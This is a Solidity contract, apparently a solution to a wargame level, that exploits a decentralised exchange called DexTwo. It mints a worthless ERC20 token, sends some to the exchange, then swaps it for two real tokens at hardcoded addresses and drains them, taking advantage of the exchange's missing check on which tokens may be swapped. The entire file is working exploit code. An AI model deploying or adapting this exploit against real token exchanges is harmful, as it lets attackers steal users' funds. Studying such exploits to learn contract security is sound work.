// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import"./DexTwo.sol";
 
contract DexAttack is ERC20
{
    DexTwo private victimContract; 
    uint constant INITIAL_SUPPLY = 5000 * 10**18;
    constructor (string memory name, string memory symbol, address _victimContractAddress) ERC20(name, symbol)
    {
        victimContract = DexTwo(_victimContractAddress);
        _mint(address(this), INITIAL_SUPPLY);
    }

    function sendToVictim() public {
        IERC20(address(this)).approve(address(this), 50);
        IERC20(address(this)).transfer(address(victimContract), 50);
    }

    function ridToken1() public {
        IERC20(address(this)).approve(address(victimContract), 50);
        victimContract.swap(address(this), 0xa5069DC6969E8f27112786b9A47E70e3D0136c74, 50);
    }

    function ridToken2() public {
        IERC20(address(this)).approve(address(victimContract), 100);
        victimContract.swap(address(this), 0x23375ffe6EECc9f8C6Fa721F5c7Bb9158fbE7C03, 100);
    }

    function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }

}